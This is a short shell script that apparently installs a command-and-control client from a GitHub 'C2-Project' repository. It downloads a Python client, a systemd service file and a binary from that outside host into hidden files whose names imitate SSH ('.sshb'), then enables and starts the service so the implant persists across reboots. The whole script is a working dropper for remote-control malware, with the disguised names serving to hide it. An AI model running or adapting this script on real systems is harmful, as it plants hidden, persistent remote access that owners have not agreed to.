#Make directory in /usr/local/bin
mkdir /var/lib/sshb/
#Curl the client file into it
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /var/lib/sshb/.sshb.py
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /usr/local/bin/.client.py
#Curl the service file into it
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.service > /var/lib/sshb/.sshb.service
#Enable and start the service
systemctl enable .sshb.service
systemctl start .sshb.service
#Curl the binary file to sshb
curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client > /var/lib/sshb/sshb
#Tell the user you finished
echo Finished!

#COPY PYTHON
